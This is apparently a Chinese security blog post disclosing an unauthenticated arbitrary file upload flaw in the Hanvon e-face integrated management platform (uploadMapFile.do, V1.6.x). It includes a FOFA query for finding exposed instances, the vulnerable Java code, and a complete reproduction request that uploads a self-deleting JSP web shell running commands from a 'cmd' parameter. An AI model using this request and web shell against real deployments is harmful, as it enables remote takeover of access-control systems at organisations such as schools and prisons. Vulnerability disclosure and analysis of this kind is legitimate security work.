---
title: "汉王e脸通综合管理平台 uploadMapFile.do 任意文件上传漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-uploadMapFile-upload-rce.html
asset_dir: assets/汉王e脸通综合管理平台-uploadmapfile.do-任意文件上传漏洞
---

# 汉王e脸通综合管理平台 uploadMapFile.do 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/12 08:25
- 1131浏览
- [0评论](#comment)
- 38分钟阅读

深入探索

安全运维咨询

授权

云安全解决方案

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `uploadMapFile.do` 接口存在任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)。攻击者可在无需认证的情况下，通过向该接口上传恶意文件，实现任意文件上传，进而可能导致[远程代码执行](https://mrxn.net/tag/rce)或服务器被控制，严重威胁系统安全。

漏洞修复方案

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

深入探索

安全认证考试

VPN服务

Web安全课程

直接看 `VisitorMapConfigController` 里关于 `uploadMapFile` 的实现

```
@ResponseBody
    @RequestMapping(
        value = {"uploadMapFile.do"},
        method = {RequestMethod.POST}
    )
    public RequestJson uploadMapFile(HttpServletRequest request) {
        RequestJson result = new RequestJson();

        try {
            String fileName = null;
            String fileType = null;
            if (!ServletFileUpload.isMultipartContent(request)) {
                result = RequestJson.failuerResult(result, "网络错误！");
                return result;
            }

            MultipartHttpServletRequest multipartRequest = (MultipartHttpServletRequest)request;
            Map<String, MultipartFile> fileMap = multipartRequest.getFileMap();
            String uploadPath = null;

            for(Map.Entry<String, MultipartFile> entity : fileMap.entrySet()) {
                MultipartFile mf = (MultipartFile)entity.getValue();
                if (!mf.isEmpty()) {
                    String fileTypeStr = mf.getOriginalFilename();
                    String fileId = UUID.randomUUID().toString().replace("-", "");
                    fileName = fileTypeStr.split("\\.")[0];
                    fileType = fileTypeStr.split("\\.")[1];
                    String path = request.getSession().getServletContext().getRealPath("/resource");
                    File tmpFile = new File(path);
                    if (!tmpFile.exists()) {
                        tmpFile.mkdir();
                    }

                    uploadPath = path + "\\" + fileId + "." + fileType;
                    File targetFile = new File(uploadPath);
                    Files.copy(mf.getInputStream(), targetFile.toPath(), new CopyOption[]{StandardCopyOption.REPLACE_EXISTING});
                    uploadPath = fileId + "." + fileType;
                    fileName = fileName + "." + fileType;
                }
            }

            Map<String, Object> map = new HashMap();
            map.put("fileName", fileName);
            map.put("fileType", fileType);
            map.put("path", uploadPath);
            result = RequestJson.successResult(result, map, "上传成功！");
        } catch (Exception e) {
            String msg = getMessage("basics_go_wrong") + e.getLocalizedMessage();
            result = RequestJson.errorResult(result, msg);
            e.printStackTrace();
        }

        return result;
    }
```

文件上传中的原始文件名`（mf.getOriginalFilename()）`和文件内容`（mf.getInputStream()）`,文件名通过 `fileTypeStr.split("\.")[1]` 提取扩展名（`fileType`），生成上传路径 `uploadPath = path + "\" + fileId + "." + fileType`，其中 `fileType` 直接受用户控制,`Files.copy(mf.getInputStream(), targetFile.toPath(), new CopyOption[]{StandardCopyOption.REPLACE_EXISTING})`，文件内容写入用户可控扩展名的文件,造成任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)。

# 漏洞复现

```
POST /manage/visitorMapConfig/uploadMapFile.do?recoToken=67mds2pxXQb HTTP/1.1
Host: hanvon.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj

------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="file"; filename="1.jsp"
Content-Type: image/jpeg

<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundaryFfJZ4PlAZBixjELj--
```

访问文件执行命令 `/manage/resource/xxxxx.jsp?cmd=whoami`

[![汉王e脸通综合管理平台 uploadMapFile.do 任意文件上传漏洞](images/img-001-54a6ac67eb6f.webp)](https://image.mrxn.net/13e3059062ff4f3b8fa5bceca30541d3.webp)

成功执行上传代码回显命令执行结果

物流软件安全

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
